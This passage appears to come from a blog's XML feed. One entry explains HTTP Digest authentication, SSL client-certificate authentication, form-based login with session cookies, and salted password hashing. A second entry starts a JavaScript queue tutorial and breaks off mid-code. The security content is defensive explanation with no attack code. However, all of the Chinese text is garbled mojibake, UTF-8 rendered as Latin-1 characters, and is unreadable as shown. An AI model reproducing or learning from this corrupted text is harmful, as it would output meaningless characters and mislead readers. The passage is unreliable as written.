è®¤è¯åŒæ ·ä½¿ç”¨è´¨è¯¢/ å“åº”çš„æ–¹å¼ï¼ˆchallenge/responseï¼‰,ä½†ä¸ä¼šåƒ BASIC è®¤è¯é‚£æ ·ç›´æŽ¥å‘é€æ˜Žæ–‡å¯†ç ã€‚ æ‰€è°“çš„è´¨è¯¢å“åº”æ–¹å¼æ˜¯æŒ‡ï¼Œä¸€å¼€å§‹ä¸€æ–¹ä¼šå‘é€è®¤è¯è¦æ±‚ç»™å¦ä¸€æ–¹ï¼ŒæŽ¥ç€ä½¿ç”¨ä»Žå¦ä¸€æ–¹é‚£æŽ¥æ”¶åˆ°çš„è´¨è¯¢ç è®¡ç®—ç”Ÿæˆå“åº”ç ã€‚æœ€åŽå°†å“åº”ç è¿”å›žç»™å¯¹æ–¹è¿›è¡Œè®¤è¯çš„æ–¹å¼ã€‚ å› æ­¤å‘é€ç»™å¯¹æ–¹çš„åªæ˜¯å“åº”æ‘˜è¦åŠç”±è´¨è¯¢ç äº§ç”Ÿçš„è®¡ç®—ç»“æžœï¼Œæ‰€ä»¥æ¯”èµ· BASIC è®¤è¯ï¼Œå¯†ç æ³„éœ²çš„å¯èƒ½æ€§å°±é™ä½Žäº†ã€‚ DIGEST è®¤è¯çš„è®¤è¯æ­¥éª¤ æ­¥éª¤1ï¼šè¯·æ±‚éœ€è®¤è¯çš„èµ„æºæ—¶ï¼ŒæœåŠ¡å™¨ä¼šéšç€çŠ¶æ€ç  401 Authorization Requiredï¼Œè¿”å›žå¸¦ WWW-Authenticate é¦–éƒ¨å­—æ®µçš„å“åº”ã€‚è¯¥å­—æ®µå†…åŒ…å«è´¨é—®å“åº”æ–¹å¼è®¤è¯æ‰€éœ€è¦çš„ä¸´æ—¶è´¨è¯¢ç ï¼ˆéšæœºæ•°ï¼Œnonceï¼‰.é¦–éƒ¨å­—æ®µ WWW-Authenticate å†…å¿…é¡»åŒ…å« realm å’Œ nonce è¿™ä¸¤ä¸ªå­—æ®µçš„ä¿¡æ¯ã€‚å®¢æˆ·ç«¯å°±æ˜¯ä¾é å‘æœåŠ¡å™¨å›žé€è¿™ä¸¤ä¸ªå€¼è¿›è¡Œè®¤è¯çš„ã€‚ nonce æ˜¯ä¸€ç§æ¯æ¬¡è¿”å›žçš„ 401 å“åº”ç”Ÿæˆçš„éšæœºå­—ç¬¦ä¸²ã€‚è¯¥å­—ç¬¦ä¸²é€šå¸¸æŽ¨èç”± Base64 ç¼–ç çš„åå…­è¿›åˆ¶æ•°çš„ç»„æˆå½¢å¼ï¼Œä½†å®žé™…å†…å®¹ä¾èµ–æœåŠ¡å™¨çš„å…·ä½“å®žçŽ°ã€‚ æ­¥éª¤2ï¼šæŽ¥æ”¶åˆ° 401 çŠ¶æ€ç çš„å®¢æˆ·ç«¯ï¼Œè¿”å›žçš„å“åº”ä¸­åŒ…å« DIGEST è®¤è¯å¿…é¡»çš„é¦–éƒ¨å­—æ®µ Authorization ä¿¡æ¯ã€‚ é¦–éƒ¨å­—æ®µ Authorization å†…å¿…é¡»åŒ…å« usernameã€realmã€nonceã€uri å’Œ response çš„å­—æ®µä¿¡æ¯ã€‚å…¶ä¸­ï¼Œrealm å’Œ nonce å°±æ˜¯ä¹‹å‰ä»ŽæœåŠ¡å™¨æŽ¥æ”¶åˆ°çš„å“åº”ä¸­çš„å­—æ®µã€‚ username æ˜¯ realm é™å®šèŒƒå›´å†…å¯è®¤è¯çš„ç”¨æˆ·åã€‚ uriï¼ˆdigest-uriï¼‰ å³ Request-URI çš„å€¼ï¼Œä½†è€ƒè™‘åˆ°ç»ä»£ç†è½¬å‘åŽ Request-URI çš„å€¼å¯èƒ½è¢«ä¿®æ”¹ï¼Œå› æ­¤äº‹å…ˆä¼šå¤åˆ¶ä¸€ä»½å‰¯æœ¬ä¿å­˜åœ¨ uri å†…ã€‚ response ä¹Ÿå¯å«åš Request-Digestï¼Œå­˜æ”¾ç»è¿‡ MD5 è¿ç®—åŽçš„å¯†ç å­—ç¬¦ä¸²ï¼Œå½¢æˆå“åº”ç ã€‚ æ­¥éª¤ 3ï¼š æŽ¥æ”¶åˆ°åŒ…å«é¦–éƒ¨å­—æ®µ Authorization è¯·æ±‚çš„æœåŠ¡å™¨ï¼Œä¼šç¡®è®¤è®¤è¯ä¿¡æ¯çš„æ­£ç¡®æ€§ã€‚è®¤è¯é€šè¿‡åŽåˆ™è¿”å›žåŒ…å« Request-URI èµ„æºçš„å“åº”ã€‚å¹¶ä¸”è¿™æ—¶ä¼šåœ¨é¦–éƒ¨å­—æ®µ Authentication-Info å†™å…¥ä¸€äº›è®¤è¯æˆåŠŸçš„ç›¸å…³ä¿¡æ¯ã€‚ DIGEST è®¤è¯æä¾›äº†é«˜äºŽ BASIC è®¤è¯çš„å®‰å…¨ç­‰çº§ï¼Œä½†æ˜¯å’Œ HTTPS çš„å®¢æˆ·ç«¯è®¤è¯ç›¸æ¯”ä»æ—§å¾ˆå¼±ã€‚DIGEST è®¤è¯æä¾›é˜²æ­¢å¯†ç è¢«çªƒå¬çš„ä¿æŠ¤æœºåˆ¶ï¼Œä½†å¹¶ä¸å­˜åœ¨é˜²æ­¢ç”¨æˆ·ä¼ªè£…çš„ä¿æŠ¤æœºåˆ¶ã€‚ DIGEST è®¤è¯å’Œ BASIC è®¤è¯ä¸€æ ·ï¼Œä½¿ç”¨ä¸Šä¸é‚£ä¹ˆä¾¿æ·çµæ´»ï¼Œä¸”ä»è¾¾ä¸åˆ°å¤šæ•° Web ç½‘ç«™å¯¹é«˜åº¦å®‰å…¨ç­‰çº§çš„è¿½æ±‚æ ‡å‡†ã€‚å› æ­¤å®ƒçš„é€‚ç”¨èŒƒå›´ä¹Ÿæœ‰æ‰€å—é™ã€‚ SSL å®¢æˆ·ç«¯è®¤è¯ä»Žä½¿ç”¨ç”¨æˆ· ID å’Œå¯†ç çš„è®¤è¯æ–¹å¼æ–¹é¢æ¥è®²ï¼Œåªè¦äºŒè€…çš„å†…å®¹æ­£ç¡®ï¼Œå³å¯è®¤è¯æ˜¯æœ¬äººçš„è¡Œä¸ºã€‚ä½†å¦‚æžœç”¨æˆ· ID å’Œå¯†ç è¢«ç›—ï¼Œå°±å¾ˆæœ‰å¯èƒ½è¢«ç¬¬ä¸‰è€…å†’å……ã€‚åˆ©ç”¨ SSL å®¢æˆ·ç«¯è®¤è¯åˆ™å¯ä»¥é¿å…è¯¥æƒ…å†µçš„å‘ç”Ÿã€‚SSL å®¢æˆ·ç«¯è®¤è¯æ˜¯å€Ÿç”± HTTPS çš„å®¢æˆ·ç«¯è¯ä¹¦å®Œæˆè®¤è¯çš„æ–¹å¼ã€‚å‡­å€Ÿå®¢æˆ·ç«¯è¯ä¹¦ï¼ˆåœ¨ HTTPS ä¸€ç« å·²è®²è§£ï¼‰è®¤è¯ï¼ŒæœåŠ¡å™¨å¯ç¡®è®¤è®¿é—®æ˜¯å¦æ¥è‡ªå·²ç™»å½•çš„å®¢æˆ·ç«¯ã€‚ SSL å®¢æˆ·ç«¯è®¤è¯çš„è®¤è¯æ­¥éª¤ä¸ºè¾¾åˆ° SSL å®¢æˆ·ç«¯è®¤è¯çš„ç›®çš„ï¼Œéœ€è¦äº‹å…ˆå°†å®¢æˆ·ç«¯è¯ä¹¦åˆ†å‘ç»™å®¢æˆ·ç«¯ï¼Œä¸”å®¢æˆ·ç«¯å¿…é¡»å®‰è£…æ­¤è¯ä¹¦ã€‚ æ­¥éª¤ 1ï¼š æŽ¥æ”¶åˆ°éœ€è¦è®¤è¯èµ„æºçš„è¯·æ±‚ï¼ŒæœåŠ¡å™¨ä¼šå‘é€ CertificateRequest æŠ¥æ–‡ï¼Œè¦æ±‚å®¢æˆ·ç«¯æä¾›å®¢æˆ·ç«¯è¯ä¹¦ã€‚ æ­¥éª¤ 2ï¼š ç”¨æˆ·é€‰æ‹©å°†å‘é€çš„å®¢æˆ·ç«¯è¯ä¹¦åŽï¼Œå®¢æˆ·ç«¯ä¼šæŠŠå®¢æˆ·ç«¯è¯ä¹¦ä¿¡æ¯ä»¥ Client Certificate æŠ¥æ–‡æ–¹å¼å‘é€ç»™æœåŠ¡å™¨ã€‚ æ­¥éª¤ 3ï¼š æœåŠ¡å™¨éªŒè¯å®¢æˆ·ç«¯è¯ä¹¦éªŒè¯é€šè¿‡åŽæ–¹å¯é¢†å–è¯ä¹¦å†…å®¢æˆ·ç«¯çš„å…¬å¼€å¯†é’¥ï¼Œç„¶åŽå¼€å§‹ HTTPS åŠ å¯†é€šä¿¡ã€‚ SSL å®¢æˆ·ç«¯è®¤è¯é‡‡ç”¨åŒå› ç´ è®¤è¯åœ¨å¤šæ•°æƒ…å†µä¸‹ï¼ŒSSL å®¢æˆ·ç«¯è®¤è¯ä¸ä¼šä»…ä¾é è¯ä¹¦å®Œæˆè®¤è¯ï¼Œä¸€èˆ¬ä¼šå’ŒåŸºäºŽè¡¨å•è®¤è¯ç»„åˆå½¢æˆä¸€ç§åŒå› ç´ è®¤è¯ï¼ˆTwo-factorauthenticationï¼‰æ¥ä½¿ç”¨ã€‚æ‰€è°“åŒå› ç´ è®¤è¯å°±æ˜¯æŒ‡ï¼Œè®¤è¯è¿‡ç¨‹ä¸­ä¸ä»…éœ€è¦å¯†ç è¿™ä¸€ä¸ªå› ç´ ï¼Œè¿˜éœ€è¦ç”³è¯·è®¤è¯è€…æä¾›å…¶ä»–æŒæœ‰ä¿¡æ¯ï¼Œä»Žè€Œä½œä¸ºå¦ä¸€ä¸ªå› ç´ ï¼Œä¸Žå…¶ç»„åˆä½¿ç”¨çš„è®¤è¯æ–¹å¼ã€‚ æ¢è¨€ä¹‹ï¼Œç¬¬ä¸€ä¸ªè®¤è¯å› ç´ çš„ SSL å®¢æˆ·ç«¯è¯ä¹¦ç”¨æ¥è®¤è¯å®¢æˆ·ç«¯è®¡ç®—æœºï¼Œå¦ä¸€ä¸ªè®¤è¯å› ç´ çš„å¯†ç åˆ™ç”¨æ¥ç¡®å®šè¿™æ˜¯ç”¨æˆ·æœ¬äººçš„è¡Œä¸ºã€‚ é€šè¿‡åŒå› ç´ è®¤è¯åŽï¼Œå°±å¯ä»¥ç¡®è®¤æ˜¯ç”¨æˆ·æœ¬äººæ­£åœ¨ä½¿ç”¨åŒ¹é…æ­£ç¡®çš„è®¡ç®—æœºè®¿é—®æœåŠ¡å™¨ã€‚ SSL å®¢æˆ·ç«¯è®¤è¯å¿…è¦çš„è´¹ç”¨ä½¿ç”¨ SSL å®¢æˆ·ç«¯è®¤è¯éœ€è¦ç”¨åˆ°å®¢æˆ·ç«¯è¯ä¹¦ã€‚è€Œå®¢æˆ·ç«¯è¯ä¹¦éœ€è¦æ”¯ä»˜ä¸€å®šè´¹ç”¨æ‰èƒ½ä½¿ç”¨ã€‚ è¿™é‡Œæåˆ°çš„è´¹ç”¨æ˜¯æŒ‡ï¼Œä»Žè®¤è¯æœºæž„è´­ä¹°å®¢æˆ·ç«¯è¯ä¹¦çš„è´¹ç”¨ï¼Œä»¥åŠæœåŠ¡å™¨è¿è¥è€…ä¸ºä¿è¯è‡ªå·±æ­å»ºçš„è®¤è¯æœºæž„å®‰å…¨è¿è¥æ‰€äº§ç”Ÿçš„è´¹ç”¨ã€‚ æ¯ä¸ªè®¤è¯æœºæž„é¢å‘å®¢æˆ·ç«¯è¯ä¹¦çš„è´¹ç”¨ä¸å°½ç›¸åŒï¼Œå¹³æ‘Šåˆ°ä¸€å¼ è¯ä¹¦ä¸Šï¼Œä¸€å¹´è´¹ç”¨çº¦å‡ ä¸‡è‡³åå‡ ä¸‡æ—¥å…ƒã€‚æœåŠ¡å™¨è¿è¥è€…ä¹Ÿå¯ä»¥è‡ªå·±æ­å»ºè®¤è¯æœºæž„ï¼Œä½†è¦ç»´æŒå®‰å…¨è¿è¡Œå°±ä¼šäº§ç”Ÿç›¸åº”çš„è´¹ç”¨ã€‚ åŸºäºŽè¡¨å•è®¤è¯åŸºäºŽè¡¨å•çš„è®¤è¯æ–¹æ³•å¹¶ä¸æ˜¯åœ¨ HTTP åè®®ä¸­å®šä¹‰çš„ã€‚å®¢æˆ·ç«¯ä¼šå‘æœåŠ¡å™¨ä¸Šçš„ Web åº”ç”¨ç¨‹åºå‘é€ç™»å½•ä¿¡æ¯ï¼ˆCredentialï¼‰ï¼ŒæŒ‰ç™»å½•ä¿¡æ¯çš„éªŒè¯ç»“æžœè®¤è¯ã€‚æ ¹æ® Web åº”ç”¨ç¨‹åºçš„å®žé™…å®‰è£…ï¼Œæä¾›çš„ç”¨æˆ·ç•Œé¢åŠè®¤è¯æ–¹å¼ä¹Ÿå„ä¸ç›¸åŒã€‚ å¤šæ•°æƒ…å†µä¸‹ï¼Œè¾“å…¥å·²äº‹å…ˆç™»å½•çš„ç”¨æˆ· IDï¼ˆé€šå¸¸æ˜¯ä»»æ„å­—ç¬¦ä¸²æˆ–é‚®ä»¶åœ°å€ï¼‰å’Œå¯†ç ç­‰ç™»å½•ä¿¡æ¯åŽï¼Œå‘é€ç»™ Web åº”ç”¨ç¨‹åºï¼ŒåŸºäºŽè®¤è¯ç»“æžœæ¥å†³å®šè®¤è¯æ˜¯å¦æˆåŠŸã€‚ è®¤è¯å¤šåŠä¸ºåŸºäºŽè¡¨å•è®¤è¯ç”±äºŽä½¿ç”¨ä¸Šçš„ä¾¿åˆ©æ€§åŠå®‰å…¨æ€§é—®é¢˜ï¼ŒHTTP åè®®æ ‡å‡†æä¾›çš„ BASIC è®¤è¯å’Œ DIGEST è®¤è¯å‡ ä¹Žä¸æ€Žä¹ˆä½¿ç”¨ã€‚å¦å¤–ï¼ŒSSL å®¢æˆ·ç«¯è®¤è¯è™½ç„¶å…·æœ‰é«˜åº¦çš„å®‰å…¨ç­‰çº§ï¼Œä½†å› ä¸ºå¯¼å…¥åŠç»´æŒè´¹ç”¨ç­‰é—®é¢˜ï¼Œè¿˜å°šæœªæ™®åŠã€‚ æ¯”å¦‚ SSH å’Œ FTP åè®®ï¼ŒæœåŠ¡å™¨ä¸Žå®¢æˆ·ç«¯ä¹‹é—´çš„è®¤è¯æ˜¯åˆä¹Žæ ‡å‡†è§„èŒƒçš„ï¼Œå¹¶ä¸”æ»¡è¶³äº†æœ€åŸºæœ¬çš„åŠŸèƒ½éœ€æ±‚ä¸Šçš„å®‰å…¨ä½¿ç”¨çº§åˆ«ï¼Œå› æ­¤è¿™äº›åè®®çš„è®¤è¯å¯ä»¥æ‹¿æ¥ç›´æŽ¥ä½¿ç”¨ã€‚ä½†æ˜¯å¯¹äºŽ Web ç½‘ç«™çš„è®¤è¯åŠŸèƒ½ï¼Œèƒ½å¤Ÿæ»¡è¶³å…¶å®‰å…¨ä½¿ç”¨çº§åˆ«çš„æ ‡å‡†è§„èŒƒå¹¶ä¸å­˜åœ¨ï¼Œæ‰€ä»¥åªå¥½ä½¿ç”¨ç”± Web åº”ç”¨ç¨‹åºå„è‡ªå®žçŽ°åŸºäºŽè¡¨å•çš„è®¤è¯æ–¹å¼ã€‚ ä¸å…·å¤‡å…±åŒæ ‡å‡†è§„èŒƒçš„è¡¨å•è®¤è¯ï¼Œåœ¨æ¯ä¸ª Web ç½‘ç«™ä¸Šéƒ½ä¼šæœ‰å„ä¸ç›¸åŒçš„å®žçŽ°æ–¹å¼ã€‚å¦‚æžœæ˜¯å…¨é¢è€ƒè™‘è¿‡å®‰å…¨æ€§èƒ½è€Œå®žçŽ°çš„è¡¨å•è®¤è¯ï¼Œé‚£ä¹ˆå°±èƒ½å¤Ÿå…·å¤‡é«˜åº¦çš„å®‰å…¨ç­‰çº§ã€‚ä½†åœ¨è¡¨å•è®¤è¯çš„å®žçŽ°ä¸­å­˜åœ¨é—®é¢˜çš„ Webç½‘ç«™ä¹Ÿæ˜¯å±¡è§ä¸é²œã€‚ Session ç®¡ç†åŠ Cookie åº”ç”¨åŸºäºŽè¡¨å•è®¤è¯çš„æ ‡å‡†è§„èŒƒå°šæœªæœ‰å®šè®ºï¼Œä¸€èˆ¬ä¼šä½¿ç”¨ Cookie æ¥ç®¡ç† Session ï¼ˆä¼šè¯ï¼‰ã€‚ åŸºäºŽè¡¨å•è®¤è¯æœ¬èº«æ˜¯é€šè¿‡æœåŠ¡å™¨ç«¯çš„ Web åº”ç”¨ï¼Œå°†å®¢æˆ·ç«¯å‘é€è¿‡æ¥çš„ç”¨æˆ· ID å’Œå¯†ç ä¸Žä¹‹å‰ç™»å½•è¿‡çš„ä¿¡æ¯åšåŒ¹é…æ¥è¿›è¡Œè®¤è¯çš„ã€‚ ä½†é‰´äºŽ HTTP æ˜¯æ— çŠ¶æ€åè®®ï¼Œä¹‹å‰å·²è®¤è¯æˆåŠŸçš„ç”¨æˆ·çŠ¶æ€æ— æ³•é€šè¿‡åè®®å±‚é¢ä¿å­˜ä¸‹æ¥ã€‚å³ï¼Œæ— æ³•å®žçŽ°çŠ¶æ€ç®¡ç†ï¼Œå› æ­¤å³ä½¿å½“è¯¥ç”¨æˆ·ä¸‹ä¸€æ¬¡ç»§ç»­è®¿é—®ï¼Œä¹Ÿæ— æ³•åŒºåˆ†ä»–ä¸Žå…¶ä»–çš„ç”¨æˆ·ã€‚äºŽæ˜¯æˆ‘ä»¬ä¼šä½¿ç”¨ Cookie æ¥ç®¡ç†Sessionï¼Œä»¥å¼¥è¡¥ HTTP åè®®ä¸­ä¸å­˜åœ¨çš„çŠ¶æ€ç®¡ç†åŠŸèƒ½ã€‚ æ­¥éª¤ 1ï¼š å®¢æˆ·ç«¯æŠŠç”¨æˆ· ID å’Œå¯†ç ç­‰ç™»å½•ä¿¡æ¯æ”¾å…¥æŠ¥æ–‡çš„å®žä½“éƒ¨åˆ†ï¼Œé€šå¸¸æ˜¯ä»¥ POST æ–¹æ³•æŠŠè¯·æ±‚å‘é€ç»™æœåŠ¡å™¨ã€‚è€Œè¿™æ—¶ï¼Œä¼šä½¿ç”¨ HTTPSé€šä¿¡æ¥è¿›è¡Œ HTML è¡¨å•ç”»é¢çš„æ˜¾ç¤ºå’Œç”¨æˆ·è¾“å…¥æ•°æ®çš„å‘é€ã€‚ æ­¥éª¤ 2ï¼š æœåŠ¡å™¨ä¼šå‘æ”¾ç”¨ä»¥è¯†åˆ«ç”¨æˆ·çš„ Session IDã€‚é€šè¿‡éªŒè¯ä»Žå®¢æˆ·ç«¯å‘é€è¿‡æ¥çš„ç™»å½•ä¿¡æ¯è¿›è¡Œèº«ä»½è®¤è¯ï¼Œç„¶åŽæŠŠç”¨æˆ·çš„è®¤è¯çŠ¶æ€ä¸ŽSession ID ç»‘å®šåŽè®°å½•åœ¨æœåŠ¡å™¨ç«¯ã€‚ å‘å®¢æˆ·ç«¯è¿”å›žå“åº”æ—¶ï¼Œä¼šåœ¨é¦–éƒ¨å­—æ®µ Set-Cookie å†…å†™å…¥ SessionIDï¼ˆå¦‚ PHPSESSID=028a8câ€¦ï¼‰ã€‚ ä½ å¯ä»¥æŠŠ Session ID æƒ³è±¡æˆä¸€ç§ç”¨ä»¥åŒºåˆ†ä¸åŒç”¨æˆ·çš„ç­‰ä½å·ã€‚ ç„¶è€Œï¼Œå¦‚æžœ Session ID è¢«ç¬¬ä¸‰æ–¹ç›—èµ°ï¼Œå¯¹æ–¹å°±å¯ä»¥ä¼ªè£…æˆä½ çš„èº«ä»½è¿›è¡Œæ¶æ„æ“ä½œäº†ã€‚å› æ­¤å¿…é¡»é˜²æ­¢ Session ID è¢«ç›—ï¼Œæˆ–è¢«çŒœå‡ºã€‚ä¸ºäº†åšåˆ°è¿™ç‚¹ï¼ŒSession ID åº”ä½¿ç”¨éš¾ä»¥æŽ¨æµ‹çš„å­—ç¬¦ä¸²ï¼Œä¸”æœåŠ¡å™¨ç«¯ä¹Ÿéœ€è¦è¿›è¡Œæœ‰æ•ˆæœŸçš„ç®¡ç†ï¼Œä¿è¯å…¶å®‰å…¨æ€§ã€‚ å¦å¤–ï¼Œä¸ºå‡è½»è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰é€ æˆçš„æŸå¤±ï¼Œå»ºè®®äº‹å…ˆåœ¨ Cookieå†…åŠ ä¸Š httponly å±žæ€§ã€‚ æ­¥éª¤ 3ï¼š å®¢æˆ·ç«¯æŽ¥æ”¶åˆ°ä»ŽæœåŠ¡å™¨ç«¯å‘æ¥çš„ Session ID åŽï¼Œä¼šå°†å…¶ä½œä¸ºCookie ä¿å­˜åœ¨æœ¬åœ°ã€‚ä¸‹æ¬¡å‘æœåŠ¡å™¨å‘é€è¯·æ±‚æ—¶ï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨å‘é€Cookieï¼Œæ‰€ä»¥ Session ID ä¹Ÿéšä¹‹å‘é€åˆ°æœåŠ¡å™¨ã€‚æœåŠ¡å™¨ç«¯å¯é€šè¿‡éªŒè¯æŽ¥æ”¶åˆ°çš„ Session ID è¯†åˆ«ç”¨æˆ·å’Œå…¶è®¤è¯çŠ¶æ€ã€‚ å¦å¤–ï¼Œä¸ä»…åŸºäºŽè¡¨å•è®¤è¯çš„ç™»å½•ä¿¡æ¯åŠè®¤è¯è¿‡ç¨‹éƒ½æ— æ ‡å‡†åŒ–çš„æ–¹æ³•ï¼ŒæœåŠ¡å™¨ç«¯åº”å¦‚ä½•ä¿å­˜ç”¨æˆ·æäº¤çš„å¯†ç ç­‰ç™»å½•ä¿¡æ¯ç­‰ä¹Ÿæ²¡æœ‰æ ‡å‡†åŒ–ã€‚é€šå¸¸ï¼Œä¸€ç§å®‰å…¨çš„ä¿å­˜æ–¹æ³•æ˜¯ï¼Œå…ˆåˆ©ç”¨ç»™å¯†ç åŠ ç›ï¼ˆsaltï¼‰çš„æ–¹å¼å¢žåŠ é¢å¤–ä¿¡æ¯ï¼Œå†ä½¿ç”¨æ•£åˆ—ï¼ˆhashï¼‰å‡½æ•°è®¡ç®—å‡ºæ•£åˆ—å€¼åŽä¿å­˜ã€‚ä½†æ˜¯æˆ‘ä»¬ä¹Ÿç»å¸¸çœ‹åˆ°ç›´æŽ¥ä¿å­˜æ˜Žæ–‡å¯†ç çš„åšæ³•ï¼Œè€Œè¿™æ ·çš„åšæ³•å…·æœ‰å¯¼è‡´å¯†ç æ³„éœ²çš„é£Žé™©ã€‚ salt å…¶å®žå°±æ˜¯ç”±æœåŠ¡å™¨éšæœºç”Ÿæˆçš„ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œä½†æ˜¯è¦ä¿è¯é•¿åº¦è¶³å¤Ÿé•¿ï¼Œå¹¶ä¸”æ˜¯çœŸæ­£éšæœºç”Ÿæˆçš„ã€‚ç„¶åŽæŠŠå®ƒå’Œå¯†ç å­—ç¬¦ä¸²ç›¸è¿žæŽ¥ï¼ˆå‰åŽéƒ½å¯ä»¥ï¼‰ç”Ÿæˆæ•£åˆ—å€¼ã€‚å½“ä¸¤ä¸ªç”¨æˆ·ä½¿ç”¨äº†åŒä¸€ä¸ªå¯†ç æ—¶ï¼Œç”±äºŽéšæœºç”Ÿæˆçš„ salt å€¼ä¸åŒï¼Œå¯¹åº”çš„æ•£åˆ—å€¼ä¹Ÿå°†æ˜¯ä¸åŒçš„ã€‚è¿™æ ·ä¸€æ¥ï¼Œå¾ˆå¤§ç¨‹åº¦ä¸Šå‡å°‘äº†å¯†ç ç‰¹å¾ï¼Œæ”»å‡»è€…ä¹Ÿå°±å¾ˆéš¾åˆ©ç”¨è‡ªå·±æ‰‹ä¸­çš„å¯†ç ç‰¹å¾åº“è¿›è¡Œç ´è§£ å‚è€ƒé“¾æŽ¥ï¼šhttps://book.douban.com/subject/25863515/]]></content>
      <categories>
        <category>http</category>
      </categories>
      <tags>
        <tag>http</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ä¸ºä»€ä¹ˆæˆ‘è¦æ”¾å¼ƒjavaScriptæ•°æ®ç»“æž„ä¸Žç®—æ³•ï¼ˆç¬¬å››ç« ï¼‰â€”â€” é˜Ÿåˆ—]]></title>
    <url>%2F2018-08-31-JavaScipt%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95Part4.html</url>
    <content type="text"><![CDATA[æœ‰ä¸¤ç§ç»“æž„ç±»ä¼¼äºŽæ•°ç»„ï¼Œä½†åœ¨æ·»åŠ å’Œåˆ é™¤å…ƒç´ æ—¶æ›´åŠ å¯æŽ§ï¼Œå®ƒä»¬å°±æ˜¯æ ˆå’Œé˜Ÿåˆ—ã€‚ ç¬¬å››ç«  é˜Ÿåˆ—é˜Ÿåˆ—æ•°æ®ç»“æž„é˜Ÿåˆ—æ˜¯éµå¾ªFIFOï¼ˆFirst In First Outï¼Œå…ˆè¿›å…ˆå‡ºï¼Œä¹Ÿç§°ä¸ºå…ˆæ¥å…ˆæœåŠ¡ï¼‰åŽŸåˆ™çš„ä¸€ç»„æœ‰åºçš„é¡¹ã€‚é˜Ÿåˆ—åœ¨å°¾éƒ¨æ·»åŠ æ–°å…ƒç´ ï¼Œå¹¶ä»Žé¡¶éƒ¨ç§»é™¤å…ƒç´ ã€‚æœ€æ–°æ·»åŠ çš„å…ƒç´ å¿…é¡»æŽ’åœ¨é˜Ÿåˆ—çš„æœ«å°¾ã€‚ çŽ°å®žä¸­ï¼Œå¾ˆå¸¸è§çš„ä¾‹å­å°±æ˜¯æŽ’é˜Ÿã€‚åœ¨è®¡ç®—æœºç§‘å­¦é‡Œé¢æ˜¯æ‰“å°é˜Ÿåˆ—ã€‚ åˆ›å»ºé˜Ÿåˆ—æˆ‘ä»¬éœ€è¦åˆ›å»ºè‡ªå·±çš„ç±»æ¥è¡¨ç¤ºä¸€ä¸ªé˜Ÿåˆ—ï¼Œå…ˆä»Žæœ€åŸºæœ¬çš„å£°æ˜Žå¼€å§‹ï¼š 123function Queue()&#123; // è¿™é‡Œæ˜¯å±žæ€§å’Œæ–¹æ³•&#125; é¦–å…ˆéœ€è¦ä¸€ä¸ªç”¨äºŽå­˜å‚¨é˜Ÿåˆ—ä¸­å…ƒç´ çš„æ•°æ®ç»“æž„ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ•°ç»„ï¼Œå°±åƒä¸Šä¸€ç«  Stack ç±»ä¸­é‚£æ ·ä½¿ç”¨ï¼ˆä½ ä¼šå‘çŽ°å…¶å®žä¸¤è€…å¾ˆç›¸ä¼¼ï¼Œåªæ˜¯æ·»åŠ å’Œç§»é™¤å…ƒç´ ä¸ä¸€æ ·è€Œå·²ã€‚ï¼‰ 1let items = [] æŽ¥ä¸‹æ¥éœ€è¦å£°æ˜Žä¸€äº›é˜Ÿåˆ—å¯ç”¨çš„æ–¹æ³•ã€‚ enqueueï¼ˆelementï¼ˆsï¼‰ï¼‰:å‘é˜Ÿåˆ—å°¾éƒ¨æ·»åŠ ä¸€ä¸ªï¼ˆæˆ–å¤šä¸ªï¼‰æ–°çš„é¡¹ã€‚ dequeueï¼ˆï¼‰ï¼šç§»é™¤é˜Ÿåˆ—ä¸­çš„ç¬¬ä¸€ä¸ªï¼ˆæŽ’åˆ—åœ¨é˜Ÿä¼æœ€å‰é¢çš„ï¼‰é¡¹ï¼Œå¹¶è¿”å›žè¢«ç§»é™¤çš„å…ƒç´  frontï¼ˆï¼‰ï¼šè¿”å›žé˜Ÿåˆ—ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ â€”â€”æœ€å…ˆè¢«æ·»åŠ ï¼Œä¹Ÿå°†æ˜¯æœ€å…ˆè¢«ç§»é™¤çš„å…ƒç´ ã€‚é˜Ÿåˆ—ä¸åšä»»ä½•å˜åŠ¨ï¼ˆä¸ç§»é™¤å…ƒç´ ï¼Œåªè¿”å›žå…ƒç´ ä¿¡æ¯â€”â€”ä¸Ž Stack ç±»çš„ peek æ–¹æ³•éžå¸¸ç›¸ä¼¼ï¼‰ isEmptyï¼ˆï¼‰ï¼šå¦‚æžœé˜Ÿåˆ—ä¸­ä¸åŒ…å«ä»»ä½•å…ƒç´ ï¼Œè¿”å›ž tureï¼Œå¦åˆ™è¿”å›ž false sizeï¼ˆï¼‰:è¿”å›žé˜Ÿåˆ—åŒ…å«çš„å…ƒç´ ä¸ªæ•°ï¼Œä¸Žæ•°ç»„çš„ length å±žæ€§ç±»ä¼¼ã€‚ å‘é˜Ÿåˆ—æ·»åŠ å…ƒç´ é¦–å…ˆè¦å®žçŽ°çš„æ˜¯ enqueue æ–¹æ³•ã€‚è¿™ä¸ªæ–¹æ³•è´Ÿè´£å‘é˜Ÿåˆ—ä¸­æ·»åŠ æ–°å…ƒç´ ï¼Œè¿˜æœ‰ä¸€ä¸ªéžå¸¸é‡è¦çš„ç»†èŠ‚ï¼Œæ–°çš„é¡¹ç›®åªèƒ½æ·»åŠ åˆ°é˜Ÿåˆ—æœ«å°¾ï¼š 123this.enqueue = function(element)&#123; return items.push(element);&#125;; ä»Žé˜Ÿåˆ—ä¸­ç§»é™¤å…ƒç´ æŽ¥ä¸‹æ¥å°±æ˜¯ dequeue æ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•è´Ÿè´£ä»Žé˜Ÿåˆ—ä¸­ç§»é™¤é¡¹ã€‚ç”±äºŽé˜Ÿåˆ—éµå¾ªå…ˆè¿›å…ˆå‡ºåŽŸåˆ™ï¼Œæœ€å…ˆæ·»åŠ çš„é¡¹ä¹Ÿæ˜¯è¦æœ€å…ˆè¢«ç§»é™¤çš„ã€‚æ•°ç»„ä¸­çš„ shift æ–¹æ³•ä¼šä»Žæ•°ç»„ä¸­ç§»é™¤å­˜å‚¨åœ¨ç´¢å¼•0ï¼ˆç¬¬ä¸€ä¸ªä½ç½®ï¼‰çš„å…ƒç´ ã€‚ 123this.dequeue = function(element)&#123; return 